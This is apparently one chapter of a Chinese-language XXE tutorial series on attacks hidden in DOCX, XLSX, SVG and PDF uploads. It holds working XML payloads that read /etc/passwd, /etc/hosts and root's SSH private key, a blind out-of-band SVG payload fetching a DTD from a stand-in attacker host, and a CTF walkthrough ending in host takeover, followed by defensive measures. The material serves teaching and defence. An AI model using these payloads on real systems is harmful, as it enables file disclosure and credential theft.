---
date: 2026-10-15
title: "03-现代复杂文档解析XXE：Office(DOCX-XLSX)、SVG与PDF隐藏实体漏洞"
---
# 现代复杂文档解析XXE：Office(DOCX-XLSX)、SVG与PDF隐藏实体漏洞

---

## 0. 基础前置知识扫盲：为什么传图片和Word也会中招？

> [!NOTE] 模块前置语言与工具清单
> - **前置通关必备**：零基础读者强烈建议先通读全局导航 **[[01-零基础入门前置指南与黑话工具字典]]**，掌握安全法律红线、终端命令行、HTTP 报文骨架与黑话字典！
> - **环境依赖**：具备基础 Web 浏览器（Chrome/Firefox）抓包认知或轻量 Python 脚本执行能力。


在前面的学习中，很多初学者会形成一个思维定势：“只有当我在 HTTP 请求中看到 `Content-Type: application/xml` 时，才会存在 XXE 漏洞。”
如果一个网站的接口是 **“上传求职简历（.docx）”**、**“导入财务报表（.xlsx）”** 或者 **“上传用户自定义头像（.svg）”**，是不是就绝对不可能有 XXE 呢？

**答案是：恰恰相反！这正是黑客最喜欢的隐蔽 XXE 重灾区！**

### 1. 通俗生活类比：特洛伊木马公文包
- **普通人的直觉**：`.docx` 是文字文件，`.xlsx` 是表格，`.svg` 是图片，怎么可能跟 XML 扯上关系？
- **计算机底层的真相**：
  从微软 Office 2007 时代开始，所有以 `docx`、`xlsx`、`pptx` 结尾的文件，本质上都遵循 **OpenXML（OOXML）标准**。
  它们**根本不是单一二进制文件，而是一个披着羊皮的“ZIP 压缩包”**！
  只要你把 `resume.docx` 的后缀改为 `resume.zip` 并解压，你会震撼地发现：**里面的每一个章节、每一段文字、每一张样式表，全都是由纯文本的 `.xml` 文件构成的！**
- **攻击者的偷梁换柱**：
  攻击者把这个“公文包”（ZIP）拉链拉开，找到里面的 `document.xml`，往里面塞进一个恶意的 DTD 外部实体，再把拉链拉上（重新打包成 `.docx`）上传到求职招聘网站。
  当后端的简历解析程序（如 Apache POI、LibreOffice）在后台自动解包并阅读其中的 XML 时，XXE 瞬间被引爆！

```mermaid
graph TD
    Attacker["攻击者构造恶意文档"] --> Step1["新建正常 test.docx"]
    Step1 --> Step2["重命名为 test.zip 并解压"]
    Step2 --> Step3["修改 word/document.xml\n注入 <!ENTITY xxe SYSTEM 'file:///etc/passwd'>"]
    Step3 --> Step4["重新打包为 zip 并改回 evil.docx"]

    evil.docx --> Upload["上传至网站简历/报表导入接口"]
    Upload --> BackendParser["后端解析库 (Apache POI / Python-docx / LibreOffice)"]
    BackendParser -->|默认开启外部实体解析| ReadPasswd["读取系统底层 /etc/passwd"]
    ReadPasswd --> Exfiltrate["通过 OOB 传给攻击者 或 直接渲染在预览网页上!"]
```

---

## 1. Office 文档（DOCX / XLSX）底层结构与投毒制作

### 1.1 DOCX 内部解剖图
将一个合法的 `.docx` 解压后，其核心目录结构如下：
```text
resume/
├── [Content_Types].xml        <-- 定义包中各部件的内容类型
├── _rels/                     <-- 关系定义
├── docProps/
│   ├── app.xml                <-- 文档元数据 (页数、字数)
│   └── core.xml               <-- 核心属性 (作者、创建时间)
└── word/
    ├── document.xml           <-- 【核心靶心】文档正文的所有段落与文字!
    ├── fontTable.xml
    └── styles.xml
```

### 1.2 武器化投毒实操全流程（手工构造恶毒 DOCX）

#### 步骤 1：解压并定位核心正文文件
```bash
unzip resume.docx -d resume_dir
cd resume_dir/word/
```

#### 步骤 2：编辑 `word/document.xml`
原始的 `document.xml` 头部通常长这样：
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
        <w:p>
            <w:r>
                <w:t>我的个人简历</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:document>
```
我们在第二行插入恶意的 DTD 实体定义，并在正文的 `<w:t>` 标签中引用它：

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!-- 注入恶意 DTD 外部实体定义 -->
<!DOCTYPE document [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
        <w:p>
            <w:r>
                <!-- 引用实体 &xxe; 将文件内容伪装成段落正文 -->
                <w:t>&xxe;</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:document>
```

#### 步骤 3：重新打包压缩
```bash
# 必须在解压目录的根目录下执行打包，不能打包外层父目录!
cd ../
zip -r ../evil_resume.docx *
```
生成完毕后，将 `evil_resume.docx` 上传到目标系统。
- **如果有在线预览功能**（服务端将 DOCX 转换成 HTML/PDF 展示在网页上）：用户在网页上点击“查看简历预览”，**屏幕上赫然出现整部 `/etc/passwd` 的明文内容**！
- **如果是后台自动化分析（无回显）**：配合上一篇讲过的 `http://attacker/evil.dtd`，通过 **Blind XXE OOB 带外信道**将敏感文件悄无声息地回传到攻击者 VPS！

---

## 2. SVG 矢量图片中的 XXE 复合利用

**SVG（Scalable Vector Graphics，可缩放矢量图形）** 是现代网页中应用极其广泛的一种图片格式（如网站 Logo、用户头像、动态图表）。

### 2.1 为什么 SVG 天生具备 XXE 基因？
与 JPG、PNG 等纯二进制光栅位图不同，**SVG 本身就是 100% 纯正的 XML 文本文件**！
任何能够上传 SVG 图片、或者在服务端使用图像处理库（如 ImageMagick、Batik、rsvg）将 SVG 转为 PNG 的地方，如果不加以防护，就是**直接向攻击者敞开大门的 XXE 提款机**！

### 2.2 有回显 SVG 攻击载荷（将敏感文件“印”在图片上！）

如果目标服务器在用户上传头像后，会自动调用后台程序把 SVG 转换成 PNG/JPG 缩略图展示给前台：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY leak SYSTEM "file:///etc/hosts">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="600" height="300">
    <!-- 绘制一个黑色背景底框 -->
    <rect width="100%" height="100%" fill="#222222"/>
    <!-- 将实体内容作为文本标签渲染出来 -->
    <text x="20" y="50" font-family="monospace" font-size="16" fill="#00ff00">
        &leak;
    </text>
</svg>
```
**震撼的攻击效果**：
服务端在将该 SVG 栅格化渲染为 PNG 图片时，XML 解析器将 `/etc/hosts` 的内容展开到了 `<text>` 标签中。
**生成的 PNG 头像图片上，清清楚楚地用绿色字体印着服务器的内部局域网 IP 与主机名！**

---

### 2.3 无回显 SVG 盲注载荷（Blind OOB）

若目标服务器上传图片后不生成预览，直接使用带外实体将数据偷走：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY % remote SYSTEM "http://attacker-vps.com/leak.dtd">
    %remote;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <circle cx="50" cy="50" r="40" fill="red" />
</svg>
```

---

## 3. PDF 解析器与 XMP / XFA 元数据注入

很多企业系统提供“发票上传验真”、“电子合同签署”或“PDF 转图片”功能。
PDF 格式虽然是复合二进制流，但它规范中深度集成了两套 XML 子系统：

1. **XMP（Extensible Metadata Platform）元数据流**：
   Adobe 允许在 PDF 的描述信息（标题、作者、相机参数）中内嵌 XML 数据流。后端很多轻量级 PDF 元数据提取库（如读取 PDF 作者名用于归档）会直接把该 XMP 流送进 XML 解析器中，引发 XXE。
2. **XFA（XML Forms Architecture）交互式动态表单**：
   用于政府和银行的高级 PDF 表单。表单结构、输入框联动完全由 XML 驱动。攻击者向表单定义中注入恶意外部实体，后端在合并或打印表单时触发攻击。

---

## 4. CTF / 实战高难度赛题复盘：从上传员工考勤表 XLSX 到击穿内网

### 赛题环境：
- 目标：某大型企业 OA 系统考勤导入接口；
- 入口：`POST /attendance/import_excel`，仅允许上传 `.xlsx` 格式的 Excel 表格；
- 目标后端：Java 开发，使用老旧的 Apache POI 库读取 Excel 内容，并将导入错误记录在前端表格中展示。

### 进攻全流程操作：

#### 步骤 1：探测 XLSX 内部结构
1. 本地使用 Excel 新建一个合法的考勤表 `template.xlsx`；
2. 解压 `template.xlsx`，观察目录发现核心数据存储在：
   `xl/worksheets/sheet1.xml`
3. 打开 `sheet1.xml`，发现单元格数据通过 `<v>` 标签存储数值或字符串索引。

#### 步骤 2：构造投毒表格
在 `xl/worksheets/sheet1.xml` 的首行插入外部实体定义，指向内网凭据文件：

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE worksheet [
    <!ENTITY secret SYSTEM "file:///root/.ssh/id_rsa">
]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <sheetData>
        <row r="1">
            <c r="A1" t="inlineStr">
                <is>
                    <!-- 将单元格字符串内容设置为实体引用 -->
                    <t>&secret;</t>
                </is>
            </c>
        </row>
    </sheetData>
</worksheet>
```

#### 步骤 3：压制上传并获取私钥
1. 重新打包为 `exploit.xlsx`；
2. 在系统界面点击“导入考勤”，选择 `exploit.xlsx` 上传；
3. **系统界面弹出错误提示**：
   `[导入警告] 第一行工号格式不合法，异常数据内容为: -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA0rK...`
4. 目标服务器将读取到的最高权限 `id_rsa` 私钥直接当成“异常单元格数据”回显打印在了前端页面中！攻击者直接通过 SSH 免密登录拿下宿主机！

---

## 5. 蓝队企业级纵深防御与文件安全处理基线

面对伪装成现代复杂文档的 XXE 攻击，企业安全团队必须落实以下综合治理措施：

1. **全面升级并加固后端文档解析组件**：
   - 若使用 Java **Apache POI**，必须升级至 4.x/5.x 以上版本（官方已默认禁用外部实体）；
   - 若使用 Python，禁止使用内置的 `xml.etree`，**强制改用第三方经过安全加固的 `defusedxml`**（专门防范各类 XML 炸弹与外部实体注入）。
2. **SVG 图片强制“位图化重新清洗”**：
   - 业务若非绝对必须，尽量在上传校验层面**禁止直接上传 SVG 格式图片**；
   - 若必须支持 SVG，后端在接收到文件后，必须在完全受限的沙箱隔离进程中**将其重新光栅化（Rasterize）为纯粹的 PNG/JPEG 二进制位图**，彻底剥离并销毁原始文件中所有的 XML 文本与脚本标签。
3. **网络层实施严格的白名单隔离**：
   - 负责文件解析的后台 Worker 节点，其容器网络应当配置为**严禁访问外网**（No Egress Internet Access），彻底断绝 Blind XXE 利用 OOB 建立反连的物理链路。
